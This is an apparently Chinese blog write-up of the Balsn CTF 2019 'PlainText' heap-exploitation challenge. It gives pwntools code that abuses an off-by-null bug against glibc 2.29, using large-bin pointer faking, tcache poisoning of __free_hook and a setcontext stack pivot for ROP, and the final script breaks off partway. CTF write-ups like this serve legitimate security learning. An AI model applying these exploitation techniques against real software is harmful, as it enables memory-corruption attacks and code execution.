@@ -1,0 +1,279 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>Balsn_CTF_2019-PlainText-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这道题确实是比较难，卡了很多天，又花了很久才复现出来。 漏洞点分析 程序的流程比较清晰简单，在 add 函数中，存在明显的 off-by-null。 而 free 中"><meta property="og:image" content><meta property="og:title" content="Balsn_CTF_2019-PlainText-WP"><meta property="og:description" content="这道题确实是比较难，卡了很多天，又花了很久才复现出来。 漏洞点分析 程序的流程比较清晰简单，在 add 函数中，存在明显的 off-by-null。 而 free 中"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1290.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-04-22T14:41:00+00:00"><meta property="article:modified_time" content="2021-04-22T14:41:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Balsn_CTF_2019-PlainText-WP"><meta name=twitter:description content="这道题确实是比较难，卡了很多天，又花了很久才复现出来。 漏洞点分析 程序的流程比较清晰简单，在 add 函数中，存在明显的 off-by-null。 而 free 中"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>Balsn_CTF_2019-PlainText-WP</h1><div class=meta>Posted on Apr 22, 2021</div></div><section class=body><p>这道题确实是比较难，卡了很多天，又花了很久才复现出来。</p><h3 id=漏洞点分析>漏洞点分析</h3><p>程序的流程比较清晰简单，在 add 函数中，存在明显的 off-by-null。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/04/1746808602.png></div><p>而 free 中对被 free 的指针进行了置空，导致无法直接 show，而程序对我们的输入末尾附加 <code>\x00</code>，也无法使用释放再申请的方法，leak 比较困难。</p><h3 id=利用思路>利用思路</h3><p>在 libc-2.29 以前，向低地址合并的代码为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>/* consolidate backward */</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>prev_inuse(p)) {
+</span></span><span style=display:flex><span>      prevsize <span style=color:#666>=</span> prev_size (p);
+</span></span><span style=display:flex><span>      size <span style=color:#666>+=</span> prevsize;
+</span></span><span style=display:flex><span>      p <span style=color:#666>=</span> chunk_at_offset(p, <span style=color:#666>-</span>((<span style=color:#902000>long</span>) prevsize));
+</span></span><span style=display:flex><span>      unlink(av, p, bck, fwd);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>在这种情况下，由于 unlink 时没有对被合并的堆块的大小进行检测，我们在利用的时候就会相对容易，比如可以通过 unlink 一个真实的小 chunk 来实现，但是在 libc-2.29 及以后的版本中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>/* consolidate backward */</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>prev_inuse(p)) {
+</span></span><span style=display:flex><span>      prevsize <span style=color:#666>=</span> prev_size (p);
+</span></span><span style=display:flex><span>      size <span style=color:#666>+=</span> prevsize;
+</span></span><span style=display:flex><span>      p <span style=color:#666>=</span> chunk_at_offset(p, <span style=color:#666>-</span>((<span style=color:#902000>long</span>) prevsize));
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (__glibc_unlikely (chunksize(p) <span style=color:#666>!=</span> prevsize))
+</span></span><span style=display:flex><span>        malloc_printerr (<span style=color:#4070a0>&#34;corrupted size vs. prev_size while consolidating&#34;</span>);
+</span></span><span style=display:flex><span>      unlink_chunk (av, p);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>合并代码变成了这样，添加了对被 unlink 的堆块的大小检测。我们难以控制一个真实 chunk 的 size 字段，被 unlink 的 chunk 必须要和下一个 chunk 相连。</p><p>而伪造的方式就是使用 large bin 遗留的 fd_nextsize 和 bk_nextsize 指针。以 fd_nextsize 为 fake_chunk 的 fd，bk_nextsize 为 fake_chunk 的 bk，这样我们可以完全控制该 fake_chunk 的 size 字段（这个过程会破坏原 large bin chunk 的 fd 指针，但是没有关系），同时还可以控制其 fd（通过部分覆写 fd_nextsize）。通过在后面使用其他的 chunk 辅助伪造，可以通过该检测</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>  if (__glibc_unlikely (chunksize(p) != prevsize))
+</span></span><span style=display:flex><span>    malloc_printerr (&#34;corrupted size vs. prev_size while consolidating&#34;);
+</span></span></code></pre></div><p>然后只需要通过 unlink 的检测就可以了，也就是 <code>fd->bk == p && bk->fd == p</code></p><p>如果 large bin 中仅有一个 chunk，那么该 chunk 的两个 nextsize 指针都会指向自己，如下</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/04/3707268351.png></div><p>我们可以控制 fd_nextsize 指向堆上的任意地址，可以容易地使之指向一个 fastbin + 0x10 - 0x18，而 fastbin 中的 fd 也会指向堆上的一个地址，通过部分覆写该指针也可以使该指针指向之前的 large bin + 0x10，这样就可以通过 <code>fd->bk == p</code> 的检测。</p><p>由于 bk_nextsize 我们无法修改，所以 bk->fd 必然在原先的 large bin chunk 的 fd 指针处（这个 fd 被我们破坏了）。通过 fastbin 的链表特性可以做到修改这个指针且不影响其他的数据，再部分覆写之就可以通过 <code>bk->fd==p</code> 的检测了。</p><p>然后通过 off-by-one 向低地址合并就可以实现 chunk overlapping 了，之后可以 leak libc_base 和 堆地址，tcache 打 __free_hook 即可。</p><h3 id=利用方法>利用方法</h3><p>为了调试方便，建议先关闭 aslr。</p><p>一开始的时候 bin 中非常的杂乱，先把这些乱七八糟的东西申请出来</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>16</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x10</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>16</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x60</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>9</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x70</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>5</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0xC0</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>2</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0xE0</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x170</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x190</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># 49</span>
+</span></span></code></pre></div><p>由于我们部分覆写的时候会被附加一个 <code>\x00</code>，所以需要调整堆地址，为了调试方便，我选择这样调整，具体原因马上说</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>add(<span style=color:#40a070>0x2A50</span>,<span style=color:#4070a0>&#39;addralign&#39;</span>) <span style=color:#60a0b0;font-style:italic># 50</span>
+</span></span></code></pre></div><p>然后进行堆布局</p><p>首先申请出一个较大的堆块，释放掉，再申请一个更大的堆块，让被释放的堆块进入 large bin</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>add(<span style=color:#40a070>0xFF8</span>,<span style=color:#4070a0>&#39;large bin&#39;</span>) <span style=color:#60a0b0;font-style:italic># 51</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x18</span>,<span style=color:#4070a0>&#39;protect&#39;</span>) <span style=color:#60a0b0;font-style:italic># 52</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>51</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x2000</span>,<span style=color:#4070a0>&#39;push to large bin&#39;</span>) <span style=color:#60a0b0;font-style:italic># 51</span>
+</span></span></code></pre></div><p>由于之前进行的堆地址调整，在我的 gdb 中，该 large bin 的低地址的低 16 位就都是 0 了（这也就是之前堆地址调整时那样调整的原因。当然这只是在调试的情况下，实际打的时候只有低 12 位能保证为零，需要爆破 4 位，概率 1/16）。</p><p>然后进行这样的布局</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x241</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x28</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 53 fd-&gt;bk : 0xA0 - 0x18</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass-loss control&#39;</span>) <span style=color:#60a0b0;font-style:italic># 54</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0xF8</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 55</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 56</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 57</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 58</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass&#39;</span>) <span style=color:#60a0b0;font-style:italic># 59</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;pass-loss control&#39;</span>) <span style=color:#60a0b0;font-style:italic># 60</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x4F8</span>,<span style=color:#4070a0>&#39;to be off-by-null&#39;</span>) <span style=color:#60a0b0;font-style:italic># 61</span>
+</span></span></code></pre></div><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/04/818308301.png></div><p>形成的效果就是上面这张图的样子。其中 chunk A 完成了对 fake chunk 的 size 和 fd，bk 指针的布局。其中 fd 将指向 <code>&amp;chunk_B - 0x18</code>并且破坏了 largebin 的 fd，之后我们会修复这个 fd 并使之指向 fake chunk。</p><p>由于 fake chunk 的 fd 指向 <code>&amp;chunk_B - 0x18</code>，我们希望 chunk B 的 fd 指向 fake chunk。所以我们需要先把它 free 掉再申请回来，然后部分覆写 fd 来实现。</p><p>chunk E 存在的意义是抬高堆地址，使之后 leak 堆地址的时候可以全部输出。</p><p>在 chunk E 和 chunk C 中夹了一些 chunk，这些 chunk 会被 overlapping，便于之后继续利用了，建议多夹一些，免得后来发现不够用。</p><p>chunk C 未来会用来对 chunk D off-by-null，然后 free chunk D 的时候就可以向地址和并了。</p><hr><p>fake chunk 的 size 已经被修改好，我们不希望在修复 large bin 的 fd 的同时把这个 size 破坏掉，所以必须把 chunk A free 到 fastbin 中。也需要把 chunk B 和 chunk C free 掉，并且希望 chunk B 的 fd 指针指向一个堆地址，部分覆写后就可以使之指向 fake_chunk 了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;tcache&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
+</span></span><span style=display:flex><span>    delete(<span style=color:#40a070>61</span> <span style=color:#666>+</span> <span style=color:#40a070>1</span> <span style=color:#666>+</span> i)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>54</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>60</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>53</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;tcache&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># 53,54,60,62,63,64,65</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x10</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 53-&gt;66</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>## stashed ##</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x10</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 54-&gt;67</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x28</span>,<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0x240</span>)) <span style=color:#60a0b0;font-style:italic># 60-&gt;68</span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>61</span>)
+</span></span></code></pre></div><p>就是这样，先把 Tcache 填满，然后依次 free chunk B C A，再把 Tcache 清空，然后申请回 chunk A，部分覆写，使 fd 指向 fake_chunk。</p><p>然后由于 Tcache 的 stash 机制，chunk B C 进入 Tcache，再申请回来的就是 chunk B，部分覆写使 fd 指向 fake_chunk。</p><p>然后申请回 chunk C，进行 off-by-null。</p><p>free chunk D，成功实现 chunk overlapping。</p><p>然后进行 leak，需要把堆地址和 libc 地址都 leak 出来，leak 的方法有许多，这里提供一种（这种方法肯定不是最好的方法，但是可以完成 leak 就行）</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>add(0x140,&#39;pass&#39;) # 61
+</span></span><span style=display:flex><span>show(56)
+</span></span><span style=display:flex><span>libc_base = u64(sh.recv(6).ljust(0x8,&#39;\x00&#39;)) - libc.sym[&#34;__malloc_hook&#34;] - 0x10 - 0x60
+</span></span><span style=display:flex><span>log.success(&#34;libc_base:&#34; + hex(libc_base))
+</span></span><span style=display:flex><span>__free_hook_addr = libc_base + libc.sym[&#34;__free_hook&#34;]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(0x28,&#39;pass&#39;) # 69&lt;-56
+</span></span><span style=display:flex><span>add(0x28,&#39;pass&#39;) # 70&lt;-57
+</span></span><span style=display:flex><span>delete(70)
+</span></span><span style=display:flex><span>delete(69)
+</span></span><span style=display:flex><span>show(56)
+</span></span><span style=display:flex><span>heap_base = u64(sh.recv(6).ljust(0x8,&#39;\x00&#39;)) - 0x1A0
+</span></span><span style=display:flex><span>log.success(&#34;heap_base:&#34; + hex(heap_base))
+</span></span></code></pre></div><p>然后进行 Tcache poisoning（这里我被卡了一小会，主要原因是一直想着通过 double free 来实现，这种想法确实挺蠢的，需要注意，Tcache poisoning 的利用只需要控制 next 指针就可以了，double free 往往是实现控制的方法，而不是必须，在本题有更好的方法，就不需要 double free 了）。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>add(0x28,p64(0) * 2) # 69&lt;-56
+</span></span><span style=display:flex><span>add(0x28,p64(0) * 2) # 70&lt;-57
+</span></span><span style=display:flex><span>add(0x28,p64(0) * 2) # 71&lt;-58
+</span></span><span style=display:flex><span>delete(68)
+</span></span><span style=display:flex><span>add(0x60,p64(0) * 5 + p64(0x31) + p64(__free_hook_addr)) # 68
+</span></span><span style=display:flex><span>add(0x28,&#39;pass&#39;) # 72
+</span></span><span style=display:flex><span>## alloc to __free_hook ##
+</span></span><span style=display:flex><span>magic_gadget = libc_base + 0x12be97
+</span></span><span style=display:flex><span>add(0x28,p64(magic_gadget)) # 73
+</span></span></code></pre></div><p>因为有 chunk overlapping，所以其实挺容易控制 next 指针的，比如通过上面这样的方法就可以分配到 __free_hook 了。</p><h3 id=白名单绕过>白名单绕过</h3><p>这个真的是非常操蛋了，题目本来就挺难的了，还加一层白名单，需要 orw，确实是比较麻烦。这种情况下，最需要的是进行栈迁移，然后 rop。</p><p>了解到一般考虑使用 setcontext 函数来进行栈迁移，其实现为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>.text:0000000000055E00 ; __unwind {
+</span></span><span style=display:flex><span>.text:0000000000055E00                 push    rdi
+</span></span><span style=display:flex><span>.text:0000000000055E01                 lea     rsi, [rdi+128h] ; nset
+</span></span><span style=display:flex><span>.text:0000000000055E08                 xor     edx, edx        ; oset
+</span></span><span style=display:flex><span>.text:0000000000055E0A                 mov     edi, 2          ; how
+</span></span><span style=display:flex><span>.text:0000000000055E0F                 mov     r10d, 8         ; sigsetsize
+</span></span><span style=display:flex><span>.text:0000000000055E15                 mov     eax, 0Eh
+</span></span><span style=display:flex><span>.text:0000000000055E1A                 syscall                 ; LINUX - sys_rt_sigprocmask
+</span></span><span style=display:flex><span>.text:0000000000055E1C                 pop     rdx
+</span></span><span style=display:flex><span>.text:0000000000055E1D                 cmp     rax, 0FFFFFFFFFFFFF001h
+</span></span><span style=display:flex><span>.text:0000000000055E23                 jnb     short loc_55E80
+</span></span><span style=display:flex><span>.text:0000000000055E25                 mov     rcx, [rdx+0E0h]
+</span></span><span style=display:flex><span>.text:0000000000055E2C                 fldenv  byte ptr [rcx]
+</span></span><span style=display:flex><span>.text:0000000000055E2E                 ldmxcsr dword ptr [rdx+1C0h]
+</span></span><span style=display:flex><span>.text:0000000000055E35                 mov     rsp, [rdx+0A0h]
+</span></span><span style=display:flex><span>.text:0000000000055E3C                 mov     rbx, [rdx+80h]
+</span></span><span style=display:flex><span>.text:0000000000055E43                 mov     rbp, [rdx+78h]
+</span></span><span style=display:flex><span>.text:0000000000055E47                 mov     r12, [rdx+48h]
+</span></span><span style=display:flex><span>.text:0000000000055E4B                 mov     r13, [rdx+50h]
+</span></span><span style=display:flex><span>.text:0000000000055E4F                 mov     r14, [rdx+58h]
+</span></span><span style=display:flex><span>.text:0000000000055E53                 mov     r15, [rdx+60h]
+</span></span><span style=display:flex><span>.text:0000000000055E57                 mov     rcx, [rdx+0A8h]
+</span></span><span style=display:flex><span>.text:0000000000055E5E                 push    rcx
+</span></span><span style=display:flex><span>.text:0000000000055E5F                 mov     rsi, [rdx+70h]
+</span></span><span style=display:flex><span>.text:0000000000055E63                 mov     rdi, [rdx+68h]
+</span></span><span style=display:flex><span>.text:0000000000055E67                 mov     rcx, [rdx+98h]
+</span></span><span style=display:flex><span>.text:0000000000055E6E                 mov     r8, [rdx+28h]
+</span></span><span style=display:flex><span>.text:0000000000055E72                 mov     r9, [rdx+30h]
+</span></span><span style=display:flex><span>.text:0000000000055E76                 mov     rdx, [rdx+88h]
+</span></span><span style=display:flex><span>.text:0000000000055E76 ; } // starts at 55E00
+</span></span></code></pre></div><p>从偏移 <code>0x55E35</code> 开始以 rdx 为基数对许多寄存器进行了赋值，也就是说如果控制了 rdx，那么就可以实现栈迁移。然而比较讨厌的是，rdx 我们无法直接控制，只能控制 rdi，幸好比较巧合的，在 libc 中有这样一个 gadget</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>0x12be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;
+</span></span></code></pre></div><p>通过使用这个 gadget 之后改变 rdx，ret 到 setcontext 之后就可以 rop 了（这个 chunk 无法通过 ROPgadget 找出，需要使用 ropper）。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>,<span style=color:#4070a0>&#34;splitw&#34;</span>,<span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./note&#34;)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#libc = ELF(&#34;/glibc/2.29/64/lib/libc.so.6&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./note-re&#34;</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.29.so&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(size,payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice: &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size: &#34;</span>,<span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Content: &#34;</span>,payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice: &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Idx: &#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(index):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Choice: &#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Idx: &#34;</span>,<span style=color:#007020>str</span>(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>16</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x10</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>16</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x60</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>9</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0x70</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>5</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0xC0</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>2</span>):
+</span></span><span style=display:flex><span>    add(<span style=color:#40a070>0xE0</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x170</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x190</span>,<span style=color:#4070a0>&#39;fill&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># 49</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x2A50</span>,<span style=color:#4070a0>&#39;addralign&#39;</span>) <span style=color:#60a0b0;font-style:italic># 50</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#add(0x4A50,&#39;addralign&#39;) # 50</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0xFF8</span>,<span style=color:#4070a0>&#39;large bin&#39;</span>) <span style=color:#60a0b0;font-style:italic># 51</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x18</span>,<span style=color:#4070a0>&#39;protect&#39;</span>) <span style=color:#60a0b0;font-style:italic># 52</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>51</span>)
